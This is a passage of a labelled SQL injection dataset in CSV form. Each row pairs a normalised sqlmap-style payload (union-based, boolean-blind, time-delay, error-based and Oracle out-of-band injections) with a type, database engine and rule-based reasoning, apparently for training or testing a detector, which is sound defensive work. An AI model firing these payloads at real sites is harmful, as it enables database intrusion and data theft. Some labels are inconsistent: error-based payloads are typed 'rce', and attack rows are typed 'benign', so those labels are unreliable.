row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3540,"-6368' union all select 6529,6529,6529--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3541,-3378' ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 'otbq' = 'otbq,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
3542,"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
3543,"1%"" ) ) and 4595 = 4595#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3544,"1%"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ""%"" = """,1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3545,-3450' where 4478 = 4478 or 9323 = 9323#,1,,boolean_blind,generic,0.95,4478 = 4478 or detected — boolean_blind injection (priority 8) on generic,rule-based
3546,"-6478"" ) ) union all select 7087,7087,7087,7087,7087,7087,7087,7087--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3547,"1 ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3548,"-3725' ) ) union all select 1541,1541,1541,1541,1541#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3549,"1%"" and 5411 = 7697 and ""%"" = """,1,,boolean_blind,generic,0.95,5411 = 7697 and detected — boolean_blind injection (priority 8) on generic,rule-based
3550,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and '%' = '",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3551,"-2059%"" or elt ( 4587 = 3101,3101 ) and ""%"" = """,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3552,"1"" ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""vnso"" like ""vnso",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
3553,"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""cxsu"" like ""cxsu",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3554,"-5158' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'noaj' like 'noaj",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
3555,"1%"" ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
3556,"1"" ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,,rce,generic,0.95,0x6d457153 detected — rce injection (priority 1) on generic,rule-based
3557,"-6733' ) where 4024 = 4024 union all select 4024,4024,4024,4024#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3558,1 ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 7805 = 7805,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3559,select ( case when ( 7980 = 3703 ) then 7980 else 7980* ( select 7980 from information_schema.character_sets ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3560,1' where 2911 = 2911,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3561,"1' ) ) as namw where 1740 = 1740 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3562,-4684 ) as uqjn where 4550 = 4550 or 1689 = 5825,1,,boolean_blind,generic,0.95,4550 = 4550 or detected — boolean_blind injection (priority 8) on generic,rule-based
3563,"1 ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 4090 = 4090",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
3564,"1'|| ( select 'dbxr' where 4014 = 4014 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
3565,"-4947' in boolean mode ) union all select 3314,3314#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3566,"-7101 ) ) ) union all select 4587,4587,4587,4587,4587,4587--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3567,1'+ ( select 'sfko' where 6853 = 6853 rlike sleep ( 5 ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3568,1'|| ( select 'xqqp' where 3007 = 3007 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3569,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""jcyh"" = ""jcyh",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
